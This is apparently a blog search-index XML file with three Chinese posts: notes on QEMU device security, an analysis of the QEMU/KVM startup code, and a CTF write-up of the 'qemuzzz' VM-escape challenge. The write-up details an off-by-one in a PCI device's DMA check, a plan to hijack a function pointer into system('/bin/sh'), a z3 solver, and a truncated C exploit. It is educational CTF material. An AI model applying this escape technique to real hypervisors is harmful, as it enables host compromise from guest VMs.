<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Qemu学习-虚拟化安全阅读笔记]]></title>
    <url>%2F2021%2F01%2F05%2FQemu%E5%AD%A6%E4%B9%A0%E2%80%94%E8%99%9A%E6%8B%9F%E5%8C%96%E5%AE%89%E5%85%A8%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[阅读VictorV&amp;肖伟前辈的虚拟化安全资料过程中的学习笔记。 qemu支持设备Virito设备，USB相关设备，网卡Networking，显卡Display，音频设备Audio/Sound，输入设备Input，存储设备Storage，直连设备PCI，CPU设备等 qemu-system-x86_64 -device ?命令查看当前qemu软件支持的设备，显示出的设备都在源码的hw目录下由一个或数个.c文件实现，设备是qemu安全性问题出现的高发点之一，我们需要从模拟这些设备的源码中来挖掘漏洞。 USB的几种接口OHCI、UHCI都是USB1.1的接口标准，而EHCI是对应USB2.0的接口标准，最新的xHCI是USB3.0的接口标准。 OHCI(Open Host Controller Interface)是支持USB1.1的标准，但它不仅仅是针对USB，还支持其他的一些接口，比如它还支持Apple的火线(Firewire，IEEE 1394)接口。与UHCI相比，OHCI的硬件复杂，硬件做的事情更多，所以实现对应的软件驱动的任务，就相对较简单。主要用于非x86的USB，如扩展卡、嵌入式开发板的USB主控。 UHCI(Universal Host Controller Interface)，是Intel主导的对USB1.0,1.1的接口标准，与OHCI不兼容。UHCI的软件驱动的任务重，需要做得比较复杂，但可以使用较便宜、较简单的硬件的USB控制器。Intel和VIA使用UHCI，而其余的硬件提供商使用OHCI。 EHCI(Enhanced Host Controller Interface)，是Intel主导的USB2.0的接口标准。EHCI仅提供USB2.0的高速功能，而依靠UHCI或OHCI来提供对全速(full-speed)或低速(low-speed)设备的支持。 xHCI(eXtensible Host Controller Interface)，是最新最火的USB3.0的接口标准，它在速度、节能、虚拟化等方面都比前面3中有了较大的提高。xHCI支持所有种类速度的USB设备(USB 3.0 SuperSpeed, USB 2.0 Low-, Full-, and High-speed, USB 1.1 Low- and Full-speed)。xHCI的目的是为了替换前面3中(UHCI/OHCI/EHCI)。 to do…]]></content>
      <categories>
        <category>Qemu&amp;KVM学习</category>
      </categories>
      <tags>
        <tag>summary</tag>
        <tag>Qemu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qemu学习-Qemu与KVM启动流程分析]]></title>
    <url>%2F2021%2F01%2F03%2FQemu%E5%AD%A6%E4%B9%A0%E2%80%94Qemu%E4%B8%8EKVM%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E6%B5%85%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Qemu我此次分析只局限于当前的5.2版本，主要目的为找到三大描述符的位置：kvmfd，vmfd，vcpufd，即： 1234int kvmfd = open("/dev/kvm", O_RDWR|O_LARGEFILE);ret = ioctl(kvmfd, KVM_GET_API_VERSION, 0);int vmfd = ioctl(kvmfd, KVM_CREATE_VM, 0); int vcpufd = ioctl(vmfd, KVM_CREATE_VCPU, 0); 老版本qemu的main函数位于vl.c文件中，但是现在已经变为了softmmu/main.c文件中，共有 初始化部分：qemu_init 主事件循环：qemu_main_loop 退出清理：qemu_cleanup 123456789/* softmmu/main.c */int main(int argc, char **argv, char **envp)&#123; qemu_init(argc, argv, envp); //完成初始化工作 qemu_main_loop(); //主事件循环 qemu_cleanup(); //退出前清理 return 0;&#125; 三大描述符qemu_init函数位于softmmu/vl.c中，2556~3539行，其有1000行左右，大部分内容为对传入的命令行参数进行parser，进行main_loop的初始化以及配置加速(kvm)等工作。 kvmfd和vmfd的创建位于accel/kvm/kvm-all.c:kvm_init： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113/* accel/kvm//kvm-all.c */static int kvm_init(MachineState *ms)&#123; MachineClass *mc = MACHINE_GET_CLASS(ms); static const char upgrade_note[] = "Please upgrade to at least kernel 2.6.29 or recent kvm-kmod\n" "(see http://sourceforge.net/projects/kvm).\n"; struct &#123; const char *name; int num; &#125; num_cpus[] = &#123; &#123; "SMP", ms-&gt;smp.cpus &#125;, &#123; "hotpluggable", ms-&gt;smp.max_cpus &#125;, &#123; NULL, &#125; &#125;, *nc = num_cpus; int soft_vcpus_limit, hard_vcpus_limit; KVMState *s; const KVMCapabilityInfo *missing_cap; int ret; int type = 0; uint64_t dirty_log_manual_caps; s = KVM_STATE(ms-&gt;accelerator); /* * On systems where the kernel can support different base page * sizes, host page size may be different from TARGET_PAGE_SIZE, * even with KVM. TARGET_PAGE_SIZE is assumed to be the minimum * page size for the system though. */ assert(TARGET_PAGE_SIZE &lt;= qemu_real_host_page_size); s-&gt;sigmask_len = 8;#ifdef KVM_CAP_SET_GUEST_DEBUG QTAILQ_INIT(&amp;s-&gt;kvm_sw_breakpoints);#endif QLIST_INIT(&amp;s-&gt;kvm_parked_vcpus); s-&gt;vmfd = -1; s-&gt;fd = qemu_open_old("/dev/kvm", O_RDWR); // 创建kvmfd if (s-&gt;fd == -1) &#123; fprintf(stderr, "Could not access KVM kernel module: %m\n"); ret = -errno; goto err; &#125; ret = kvm_ioctl(s, KVM_GET_API_VERSION, 0); // 检测kvm的api_version if (ret &lt; KVM_API_VERSION) &#123; if (ret &gt;= 0) &#123; ret = -EINVAL; &#125; fprintf(stderr, "kvm version too old\n"); goto err; &#125; if (ret &gt; KVM_API_VERSION) &#123; ret = -EINVAL; fprintf(stderr, "kvm version not supported\n"); goto err; &#125; kvm_immediate_exit = kvm_check_extension(s, KVM_CAP_IMMEDIATE_EXIT); s-&gt;nr_slots = kvm_check_extension(s, KVM_CAP_NR_MEMSLOTS); /* If unspecified, use the default value */ if (!s-&gt;nr_slots) &#123; s-&gt;nr_slots = 32; &#125; s-&gt;nr_as = kvm_check_extension(s, KVM_CAP_MULTI_ADDRESS_SPACE); if (s-&gt;nr_as &lt;= 1) &#123; s-&gt;nr_as = 1; &#125; s-&gt;as = g_new0(struct KVMAs, s-&gt;nr_as); if (object_property_find(OBJECT(current_machine), "kvm-type")) &#123; g_autofree char *kvm_type = object_property_get_str(OBJECT(current_machine), "kvm-type", &amp;error_abort); type = mc-&gt;kvm_type(ms, kvm_type); &#125; do &#123; ret = kvm_ioctl(s, KVM_CREATE_VM, type); //创建vmfd &#125; while (ret == -EINTR); if (ret &lt; 0) &#123; fprintf(stderr, "ioctl(KVM_CREATE_VM) failed: %d %s\n", -ret, strerror(-ret));#ifdef TARGET_S390X if (ret == -EINVAL) &#123; fprintf(stderr, "Host kernel setup problem detected. Please verify:\n"); fprintf(stderr, "- for kernels supporting the switch_amode or" " user_mode parameters, whether\n"); fprintf(stderr, " user space is running in primary address space\n"); fprintf(stderr, "- for kernels supporting the vm.allocate_pgste sysctl, " "whether it is enabled\n"); &#125;#endif goto err; &#125; ... cpus_register_accel(&amp;kvm_cpus); // 将kvm_cpus注册到cpus_accel return 0;err: ... return ret;&#125; vcpufd的创建位置于： 12345accel/kvm/kvm-cpus.c:kvm_start_vcpu_thread //调用qemu_thread_create(kvm_vcpu_thread_fn) accel/kvm/kvm-cpus.c:kvm_vcpu_thread_fn accel/kvm/kvm-all.c:kvm_init_vcpu accel/kvm/kvm-all.c:kvm_get_vcpu accel/kvm/kvm-all.c:kvm_vm_ioctl 1234567891011121314151617181920212223242526272829303132333435static int kvm_get_vcpu(KVMState *s, unsigned long vcpu_id)&#123; struct KVMParkedVcpu *cpu; QLIST_FOREACH(cpu, &amp;s-&gt;kvm_parked_vcpus, node) &#123; if (cpu-&gt;vcpu_id == vcpu_id) &#123; int kvm_fd; QLIST_REMOVE(cpu, node); kvm_fd = cpu-&gt;kvm_fd; g_free(cpu); return kvm_fd; &#125; &#125; return kvm_vm_ioctl(s, KVM_CREATE_VCPU, (void *)vcpu_id); // &lt;=== here&#125;int kvm_vm_ioctl(KVMState *s, int type, ...)&#123; int ret; void *arg; va_list ap; va_start(ap, type); arg = va_arg(ap, void *); va_end(ap); trace_kvm_vm_ioctl(type, arg); ret = ioctl(s-&gt;vmfd, type, arg); // &lt;=== here if (ret == -1) &#123; ret = -errno; &#125; return ret;&#125; 而kvm_start_vcpu_thread调用点位于注册的一个CpusAccel类的实例kvm_cpus，kvm_start_vcpu_thread作为其中的.create_vcpu_thread函数指针，其在kvm_init函数中被cpus_register_accel被赋值给了cpus_accel: 123456789101112131415161718192021222324252627282930// accel/kvm/kvm-cpus.cstatic void kvm_start_vcpu_thread(CPUState *cpu)&#123; char thread_name[VCPU_THREAD_NAME_SIZE]; cpu-&gt;thread = g_malloc0(sizeof(QemuThread)); cpu-&gt;halt_cond = g_malloc0(sizeof(QemuCond)); qemu_cond_init(cpu-&gt;halt_cond); snprintf(thread_name, VCPU_THREAD_NAME_SIZE, "CPU %d/KVM", cpu-&gt;cpu_index); qemu_thread_create(cpu-&gt;thread, thread_name, kvm_vcpu_thread_fn, //创建新线程调用kvm_vcpu_thread_fn cpu, QEMU_THREAD_JOINABLE);&#125;const CpusAccel kvm_cpus = &#123; .create_vcpu_thread = kvm_start_vcpu_thread, // kvm_start_vcpu_thread被作为.create_vcpu_thread函数指针 .synchronize_post_reset = kvm_cpu_synchronize_post_reset, .synchronize_post_init = kvm_cpu_synchronize_post_init, .synchronize_state = kvm_cpu_synchronize_state, .synchronize_pre_loadvm = kvm_cpu_synchronize_pre_loadvm,&#125;;// softmmu/cpus.cvoid cpus_register_accel(const CpusAccel *ca) // 在kvm中被调用&#123; assert(ca != NULL); assert(ca-&gt;create_vcpu_thread != NULL); /* mandatory */ cpus_accel = ca; // kvm_cpus被传给cpus_accel&#125; 在qemu_init_vcpu函数中通过调用cpus_accel-&gt;create_vcpu_thread函数指针调用了kvm_start_vcpu_thread： 12345678910111213141516171819202122232425void qemu_init_vcpu(CPUState *cpu)&#123; MachineState *ms = MACHINE(qdev_get_machine()); cpu-&gt;nr_cores = ms-&gt;smp.cores; cpu-&gt;nr_threads = ms-&gt;smp.threads; cpu-&gt;stopped = true; cpu-&gt;random_seed = qemu_guest_random_seed_thread_part1(); if (!cpu-&gt;as) &#123; /* If the target cpu hasn't set up any address spaces itself, * give it the default one. */ cpu-&gt;num_ases = 1; cpu_address_space_init(cpu, 0, "cpu-memory", cpu-&gt;memory); &#125; /* accelerators all implement the CpusAccel interface */ g_assert(cpus_accel != NULL &amp;&amp; cpus_accel-&gt;create_vcpu_thread != NULL); cpus_accel-&gt;create_vcpu_thread(cpu); while (!cpu-&gt;created) &#123; qemu_cond_wait(&amp;qemu_cpu_cond, &amp;qemu_global_mutex); &#125;&#125; 123456...qom/object.c:object_property_set_bool qom/qom-object.c:object_property_set_qobject qom/object.c:property_set_bool //通过prop-&gt;set函数指针调用device_set_realized hw/core/qdev.c:device_set_realized //通过dc-&gt;realize函数指针调用x86_cpu_realizefn target/i386/cpu.c:x86_cpu_realizefn 而kvm_init这个函数则是在accel_init_machine函数中通过init_machine函数指针调用的，调用链如下： kvm_init的调用链： 1234softmmu/vl.c:qemu_init softmmu/vl.c:configure_accelerators softmmu/vl.c:do_configure_accelerator softmmu/vl.c:accel_init_machine 12345678910111213141516int accel_init_machine(AccelState *accel, MachineState *ms)&#123; AccelClass *acc = ACCEL_GET_CLASS(accel); int ret; ms-&gt;accelerator = accel; *(acc-&gt;allowed) = true; ret = acc-&gt;init_machine(ms); //调用kvm_init函数 if (ret &lt; 0) &#123; ms-&gt;accelerator = NULL; *(acc-&gt;allowed) = false; object_unref(OBJECT(accel)); &#125; else &#123; object_set_accelerator_compat_props(acc-&gt;compat_props); &#125; return ret;&#125; 而函数指针的赋值地点为kvm_accel_class_init函数，其作为kvm_accel_type这个TypeInfo的.class_init函数被调用： 12345678910111213141516171819202122232425262728static void kvm_accel_class_init(ObjectClass *oc, void *data)&#123; AccelClass *ac = ACCEL_CLASS(oc); ac-&gt;name = "KVM"; ac-&gt;init_machine = kvm_init; //被作为AccelClass实例ac的init_machine函数指针 ac-&gt;has_memory = kvm_accel_has_memory; ac-&gt;allowed = &amp;kvm_allowed; object_class_property_add(oc, "kernel-irqchip", "on|off|split", NULL, kvm_set_kernel_irqchip, NULL, NULL); object_class_property_set_description(oc, "kernel-irqchip", "Configure KVM in-kernel irqchip"); object_class_property_add(oc, "kvm-shadow-mem", "int", kvm_get_kvm_shadow_mem, kvm_set_kvm_shadow_mem, NULL, NULL); object_class_property_set_description(oc, "kvm-shadow-mem", "KVM shadow MMU size");&#125;static const TypeInfo kvm_accel_type = &#123; .name = TYPE_KVM_ACCEL, .parent = TYPE_ACCEL, .instance_init = kvm_accel_instance_init, .class_init = kvm_accel_class_init, // 被作为kvm_accel_type这个TypeInfo的class_init函数 .instance_size = sizeof(KVMState),&#125;; Run VM接下来找一下vm运行地方，和核心逻辑在函数kvm_cpu_exec中，其与上述获取vcpufd的kvm_init_vcpu函数同在kvm_vcpu_thread_fn函数中， 12345678910111213141516171819202122232425262728293031323334353637/* accel/kvm/kvm-cpus.c */static void *kvm_vcpu_thread_fn(void *arg)&#123; CPUState *cpu = arg; int r; rcu_register_thread(); qemu_mutex_lock_iothread(); qemu_thread_get_self(cpu-&gt;thread); cpu-&gt;thread_id = qemu_get_thread_id(); cpu-&gt;can_do_io = 1; current_cpu = cpu; r = kvm_init_vcpu(cpu, &amp;error_fatal); //上述获取vcpufd的地方 kvm_init_cpu_signals(cpu); /* signal CPU creation */ cpu_thread_signal_created(cpu); qemu_guest_random_seed_thread_part2(cpu-&gt;random_seed); do &#123; if (cpu_can_run(cpu)) &#123; r = kvm_cpu_exec(cpu); //kvm虚拟机运行的主逻辑 if (r == EXCP_DEBUG) &#123; cpu_handle_guest_debug(cpu); &#125; &#125; qemu_wait_io_event(cpu); &#125; while (!cpu-&gt;unplug || cpu_can_run(cpu)); kvm_destroy_vcpu(cpu); cpu_thread_signal_destroyed(cpu); qemu_mutex_unlock_iothread(); rcu_unregister_thread(); return NULL;&#125; kvm_cpu_exec的主逻辑可简化如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778int kvm_cpu_exec(CPUState *cpu)&#123; ... run_ret = kvm_vcpu_ioctl(cpu, KVM_RUN, 0); //vcpu开始运行 ... do&#123; ... trace_kvm_run_exit(cpu-&gt;cpu_index, run-&gt;exit_reason); //捕获到退出客户机 switch (run-&gt;exit_reason) &#123; //根据原因进行对应的处理 case KVM_EXIT_IO: //I/O设备处理 DPRINTF("handle_io\n"); /* Called outside BQL */ kvm_handle_io(run-&gt;io.port, attrs, (uint8_t *)run + run-&gt;io.data_offset, run-&gt;io.direction, run-&gt;io.size, run-&gt;io.count); ret = 0; break; case KVM_EXIT_MMIO: //访问mmio处理 DPRINTF("handle_mmio\n"); /* Called outside BQL */ address_space_rw(&amp;address_space_memory, run-&gt;mmio.phys_addr, attrs, run-&gt;mmio.data, run-&gt;mmio.len, run-&gt;mmio.is_write); ret = 0; break; case KVM_EXIT_IRQ_WINDOW_OPEN: //中断处理 DPRINTF("irq_window_open\n"); ret = EXCP_INTERRUPT; break; case KVM_EXIT_SHUTDOWN: //关机处理 DPRINTF("shutdown\n"); qemu_system_reset_request(SHUTDOWN_CAUSE_GUEST_RESET); ret = EXCP_INTERRUPT; break; case KVM_EXIT_UNKNOWN: fprintf(stderr, "KVM: unknown exit, hardware reason %" PRIx64 "\n", (uint64_t)run-&gt;hw.hardware_exit_reason); ret = -1; break; case KVM_EXIT_INTERNAL_ERROR: //内部错误处理/异常? ret = kvm_handle_internal_error(cpu, run); break; case KVM_EXIT_SYSTEM_EVENT: //系统事件处理 switch (run-&gt;system_event.type) &#123; case KVM_SYSTEM_EVENT_SHUTDOWN: qemu_system_shutdown_request(SHUTDOWN_CAUSE_GUEST_SHUTDOWN); ret = EXCP_INTERRUPT; break; case KVM_SYSTEM_EVENT_RESET: qemu_system_reset_request(SHUTDOWN_CAUSE_GUEST_RESET); ret = EXCP_INTERRUPT; break; case KVM_SYSTEM_EVENT_CRASH: kvm_cpu_synchronize_state(cpu); qemu_mutex_lock_iothread(); qemu_system_guest_panicked(cpu_get_crash_info(cpu)); qemu_mutex_unlock_iothread(); ret = 0; break; default: DPRINTF("kvm_arch_handle_exit\n"); ret = kvm_arch_handle_exit(cpu, run); break; &#125; break; default: DPRINTF("kvm_arch_handle_exit\n"); ret = kvm_arch_handle_exit(cpu, run); break; &#125; &#125; while (ret == 0) ...&#125; Qemu的分析就到这里了，看一下KVM中的部分。 KVM在Qemu调用kvm_cpu_exec()中的后： 1run_ret = kvm_vcpu_ioctl(cpu, KVM_RUN, 0); 程序将陷入内核态，被kvm接管，进入kvm_vcpu_ioctl()： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889/* virt/kvm/kvm_main.c:3237 */static long kvm_vcpu_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)&#123; struct kvm_vcpu *vcpu = filp-&gt;private_data; void __user *argp = (void __user *)arg; int r; struct kvm_fpu *fpu = NULL; struct kvm_sregs *kvm_sregs = NULL; if (vcpu-&gt;kvm-&gt;mm != current-&gt;mm) return -EIO; if (unlikely(_IOC_TYPE(ioctl) != KVMIO)) return -EINVAL; /* * Some architectures have vcpu ioctls that are asynchronous to vcpu * execution; mutex_lock() would break them. */ r = kvm_arch_vcpu_async_ioctl(filp, ioctl, arg); if (r != -ENOIOCTLCMD) return r; if (mutex_lock_killable(&amp;vcpu-&gt;mutex)) return -EINTR; switch (ioctl) &#123; //根据传入的参数解析，我们传入的为KVM_RUN case KVM_RUN: &#123; //进入此分支 struct pid *oldpid; r = -EINVAL; if (arg) goto out; oldpid = rcu_access_pointer(vcpu-&gt;pid); if (unlikely(oldpid != task_pid(current))) &#123; /* The thread running this VCPU changed. */ struct pid *newpid; r = kvm_arch_vcpu_run_pid_change(vcpu); if (r) break; newpid = get_task_pid(current, PIDTYPE_PID); rcu_assign_pointer(vcpu-&gt;pid, newpid); if (oldpid) synchronize_rcu(); put_pid(oldpid); &#125; r = kvm_arch_vcpu_ioctl_run(vcpu); //核心逻辑 trace_kvm_userspace_exit(vcpu-&gt;run-&gt;exit_reason, r); break; &#125; case KVM_GET_REGS: &#123; ... &#125; case KVM_SET_REGS: &#123; ... &#125; case KVM_GET_SREGS: &#123; ... &#125; case KVM_SET_SREGS: &#123; ... &#125; case KVM_GET_MP_STATE: &#123; ... &#125; case KVM_SET_MP_STATE: &#123; ... &#125; case KVM_TRANSLATE: &#123; ... &#125; case KVM_SET_GUEST_DEBUG: &#123; ... &#125; case KVM_SET_SIGNAL_MASK: &#123; ... &#125; case KVM_GET_FPU: &#123; ... &#125; case KVM_SET_FPU: &#123; ... &#125; default: r = kvm_arch_vcpu_ioctl(filp, ioctl, arg); &#125; ...&#125; 之后进一步进入kvm_arch_vcpu_ioctl_run(arch/x86/kvm/x86.c:9301)函数，在其中又掉用了vcpu_run()函数： 1234567891011121314151617181920212223/* arch/x86/kvm/x86.c:9121 */static int vcpu_run(struct kvm_vcpu *vcpu)&#123; int r; struct kvm *kvm = vcpu-&gt;kvm; vcpu-&gt;srcu_idx = srcu_read_lock(&amp;kvm-&gt;srcu); vcpu-&gt;arch.l1tf_flush_l1d = true; for (;;) &#123; if (kvm_vcpu_running(vcpu)) &#123; r = vcpu_enter_guest(vcpu); //循环进入Guest模式 &#125; else &#123; r = vcpu_block(kvm, vcpu); &#125; if (r &lt;= 0) //r&lt;=0时返回qemu break; ... &#125; ... return r;&#125; 我们看到当KVM通过vcpu_run()进入主循环后，调用vcpu_enter_guest()，从名字上看可以知道这是进入Guest模式的入口： 当r&gt;0时KVM会一直调用vcpu_enter_guest()，重复进入Guest模式。 当r&lt;=0时则会跳出循环体，此时会一步一步退到当初的入口kvm_vcpu_ioctl()，乃至于退回到用户态空间Qemu进程中，承接kvm_cpu_exec中switch (run-&gt;exit_reason) {...位置。 https://luohao-brian.gitbooks.io/interrupt-virtualization/content/kvm-run-processzhi-kvm-he-xin-liu-cheng.html]]></content>
      <categories>
        <category>Qemu&amp;KVM学习</category>
      </categories>
      <tags>
        <tag>summary</tag>
        <tag>KVM</tag>
        <tag>Qemu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析]]></title>
    <url>%2F2020%2F12%2F24%2FXCTF%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98%E6%8C%91%E6%88%98%E8%B5%9B_%E5%8D%8E%E4%B8%BA%E4%BA%91%E4%B8%93%E5%9C%BA_qemuzzz%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[qemuzzz前言2020XCTF高校网络安全专题挑战赛的华为云专场在12.23举行，因为某些原因队里几位本科师傅决定在期末周中抽出一天冲个前三，我比较菜，逃逸相关的题目中只做出了这一道题，在此记录一下解题过程。 解题过程逆向，函数功能分析首先用strings看了一下，发现是在20.04上编译的，于是在ubuntu20.04的docker中尝试启动，幸运地发现可以直接启动： 查看launch.sh，发现qemu加载了名为zzz的设备，根据经验可知这就是我们的目标设备了，出题人比较善良，没有去除符号表，直接搜索函数名称即可得到相关函数，配合zzz_class_init和lspci可以发现zzz为00:04.0这个设备： 1234567891011121314151617__int64 __fastcall zzz_class_init(__int64 a1)&#123; __int64 result; // rax result = object_class_dynamic_cast_assert( a1, "pci-device", "/opt/qemu-5.2.0/include/hw/pci/pci.h", 201LL, "PCI_DEVICE_CLASS"); *(_QWORD *)(result + 0xB0) = pci_zzz_realize; *(_QWORD *)(result + 0xB8) = pci_zzz_uninit; *(_DWORD *)(result + 0xD0) = 0x23331234; // &lt; === here !!! *(_BYTE *)(result + 0xD4) = 16; *(_WORD *)(result + 0xD6) = 0xFF; return result;&#125; 然后开始分析设备的相关功能，首先其在初始化实例时，向设备控制块的0x19F0和0x19F8偏移处赋值了设备控制块的基址和cpu_physical_memory_rw函数的地址： 123456789__int64 __fastcall zzz_instance_init(__int64 a1)&#123; __int64 result; // rax result = object_dynamic_cast_assert(a1, &amp;off_7CE55E, "../hw/misc/zzz.c", 135LL, "zzz_instance_init"); *(_QWORD *)(result + 0x19F0) = result; *(_QWORD *)(result + 0x19F8) = cpu_physical_memory_rw; return result;&#125; 然后在pci_zzz_realize中注册了一块0x100000的mmio内存块： 123456__int64 __fastcall pci_zzz_realize(__int64 a1)&#123; *(_BYTE *)(*(_QWORD *)(a1 + 0x90) + 0x3DLL) = 1; memory_region_init_io(a1 + 0x8F0, a1, zzz_mmio_ops, a1, "zzz-mmio", 0x100000LL); return pci_register_bar(a1, 0LL, 0LL, a1 + 0x8F0);&#125; 查看内存块对应的读写函数zzz_mmio_read &amp;&amp; zzz_mmio_write，读函数中并没有什么问题，就是用户传入offset，然后从设备缓冲区中对应offset处取出一个字符返回给用户，设备缓冲区范围为[a1+0x9F0,a1+0x19F0)： 123456789__int64 __fastcall zzz_mmio_read(__int64 a1, unsigned __int64 a2)&#123; __int64 result; // rax result = 0LL; if ( a2 &lt;= 0xFFF ) result = *(unsigned __int8 *)(a1 + a2 + 0x9F0); return result;&#125; 写函数中有五个功能，在分析功能前，先阐明*(QWORD*)(a1+0x9E0)为phyaddr，*(WORD*)(a1+0x9E8)为base，base &amp; 0x7FFE为len，*(unsigned int16*)(a1+0x9EA)为offset，第一个功能为向phyaddr赋值，需要注意的是用户传入的物理地址需要提前&gt;&gt;12： 1234if ( cmd == 0x20 )&#123; *(_QWORD *)(a1 + 0x9E0) = a3 &lt;&lt; 12;&#125; 第二个功能为向offset赋值，有上下限检测，不可大于0xfff： 123456789101112if ( cmd == 0x10 )&#123; if ( a3 &gt; 0xFFF ) &#123; if ( *(_WORD *)(a1 + 0x9EA) &gt; 0xFFFu ) *(_WORD *)(a1 + 0x9EA) = 0; &#125; else &#123; *(_WORD *)(a1 + 0x9EA) = a3; &#125;&#125; 第三个功能为向base赋值： 1234else if ( cmd == 0x18 )&#123; *(_WORD *)(a1 + 0x9E8) = a3;&#125; 第四个功能刚开始看感觉很奇怪，其以offset为起始，len为长度，逐16bit将设备缓冲区中的数据异或521(0x209)： 123456789101112else if ( cmd == 0x50 )&#123; v9 = *(unsigned __int16 *)(a1 + 0x9EA); v10 = *(_WORD *)(a1 + 0x9E8) &amp; 0x7FFE; if ( (int)v9 + v10 &gt;= 0x1000 ) v10 = 0xFFF - v9; for ( i = v9 + a1; v10 / 2 &gt; (int)v9; i += 2LL ) &#123; *(_WORD *)(i + 0x9F0) ^= 0x209u; LODWORD(v9) = v9 + 2; &#125;&#125; 第五个功能为核心功能，其使用cpu_physical_memory_rw函数(以函数指针的形式调用)对内存进行直接读写(可以看作实现了一个简易的DMA)，其中base &amp; 1作为读写标志位： 当base &amp; 1 == 1时，从设备缓冲区的offset起向phyaddr拷贝len个字节的数据。 当base &amp; 1 == 0时，从phyaddr起向设备缓冲区的offset拷贝len个字节的数据。 123456789101112131415161718192021else if ( cmd == 0x60 )&#123; v3 = *(_QWORD *)(a1 + 0x19F0); if ( (*(_QWORD *)(v3 + 0x9E0) &amp; 0xFFF) == 0 ) &#123; base = *(_WORD *)(v3 + 0x9E8); offset = *(unsigned __int16 *)(v3 + 0x9EA); len = base &amp; 0x7FFE; if ( (int)(offset + (base &amp; 0x7FFE) - 1) &lt;= 0x1000 ) &#123; v7 = *(void (__fastcall **)(_QWORD, __int64, _QWORD, __int64))(a1 + 0x19F8); v8 = v3 + offset + 0x9F0; if ( (base &amp; 1) != 0 ) v7(*(_QWORD *)(v3 + 0x9E0), v8, len, 1LL); else v7(*(_QWORD *)(v3 + 0x9E0), v8, len, 0LL); if ( *(__int16 *)(v3 + 0x9E8) &lt; 0 ) pci_set_irq(v3, 1u); &#125; &#125;&#125; 漏洞分析漏洞点位于功能五中，在对offset+len的上限进行检测时，本应是offset + len &lt;= 0x1000写为了offset + len - 1 &lt;= 0x1000，也就是说offset+len可以达到0x1001的长度，而设备缓冲区只有0x1000长度，产生了一个off-by-one，进而可以读写到a1+0x19F0处的值： 123456789101112131415161718192021else if ( cmd == 0x60 )&#123; v3 = *(_QWORD *)(a1 + 0x19F0); if ( (*(_QWORD *)(v3 + 0x9E0) &amp; 0xFFF) == 0 ) &#123; base = *(_WORD *)(v3 + 0x9E8); offset = *(unsigned __int16 *)(v3 + 0x9EA); len = base &amp; 0x7FFE; if ( (int)(offset + (base &amp; 0x7FFE) - 1) &lt;= 0x1000 ) // &lt; === here!!! &#123; v7 = *(void (__fastcall **)(_QWORD, __int64, _QWORD, __int64))(a1 + 0x19F8); v8 = v3 + offset + 0x9F0; if ( (base &amp; 1) != 0 ) v7(*(_QWORD *)(v3 + 0x9E0), v8, len, 1LL); else v7(*(_QWORD *)(v3 + 0x9E0), v8, len, 0LL); if ( *(__int16 *)(v3 + 0x9E8) &lt; 0 ) pci_set_irq(v3, 1u); &#125; &#125;&#125; 利用先checksec看一下，发现保护全开，加上题目中存在system函数和函数指针(cpu_physical_memory_rw)，所以初步思路为考虑泄露elfbase并劫持函数指针来劫持执行流。 leak因为可以读写a1+0x19F0处的值，所以我们可以先将其读出，然后在加上0x10写回去，这样等于将设备控制块整体向后移动了0x10字节(需要提前布置好base和offset)，这样我们再用功能五读数据时就可以将设备控制块的基址和cpu_physical_memory_rw地址读出，从而获取到堆地址和elfbase。 但是leak之后的问题是我们不再能使用功能一和功能二控制offset和base了，所以没办法将读标志位改为写标志位来进行hijack。 hijack这时候需要用到奇怪的功能四了，其将设备缓冲区中数据与521异或用以将读标志位改为写标志位，但是为了保证异或后的len和offset仍然可以修改到函数指针和设备控制块基址，所以需要用z3解一个方程，这应该也是题目名字叫做qemuzzz的原因吧： 1234567891011121314from z3 import *solver = Solver()a = BitVec('a', 24)b = BitVec('b', 24)solver.add(a&lt;0x1000)solver.add(b&lt;0x1000)solver.add(a + b&amp;0x7ffe == 0x1000) #0x1000可以浮动solver.add(a^0x209 + ((b^0x209)&amp;0x7ffe) == 0xffe) #0xffe可以浮动solver.check()print(solver.model()) 解出2575和1521两个数，之后就重新构造偏移再填入函数指针(system地址)和设备控制块基址(需要*(_QWORD *)(v3 + 0x9E0) &amp; 0xFFF) == 0且*(_QWORD *)(v3 + 0x9E0) == /bin/sh的地址，最后触发即可。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)#define PFN_PRESENT (1ull &lt;&lt; 63)#define PFN_PFN ((1ull &lt;&lt; 55) - 1)int fd;unsigned char* mmio_mem;void perr(char str[])&#123; puts(str); exit(1);&#125;void mmio_write(uint32_t addr, uint32_t value)&#123; *((uint32_t*)(mmio_mem + addr)) = value;&#125;uint8_t mmio_read(uint64_t addr)&#123; return *((uint8_t*)(mmio_mem + addr));&#125;uint32_t page_offset(uint32_t addr)&#123; return addr &amp; ((1 &lt;&lt; PAGE_SHIFT) - 1);&#125;uint64_t gva_to_gfn(void *addr)&#123; uint64_t pme, gfn; size_t offset; offset = ((uintptr_t)addr &gt;&gt; 9) &amp; ~7; lseek(fd, offset, SEEK_SET); read(fd, &amp;pme, 8); if (!(pme 